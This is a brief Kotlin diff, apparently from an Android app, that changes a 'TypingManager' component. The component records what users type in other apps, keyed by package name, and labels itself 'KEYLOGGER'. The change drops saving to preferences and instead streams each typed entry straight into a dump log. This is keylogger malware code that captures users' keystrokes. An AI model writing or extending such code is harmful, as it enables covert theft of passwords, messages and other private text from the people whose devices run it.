@@ -73,11 +73,9 @@ object TypingManager {
             history.put(entry)
         }
 
-        // ANR FIX: Save in background
-        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-            prefs.edit().putString("typing_history", history.toString()).apply()
-            DumpManager.logVerification("KEYLOGGER", pkg)
-        }
+        // LOGGING (STREAM)
+        DumpManager.appendLog("KEY", entry)
+        DumpManager.logVerification("KEYLOGGER", pkg)
         
         lastPkg = pkg
         lastTs = now
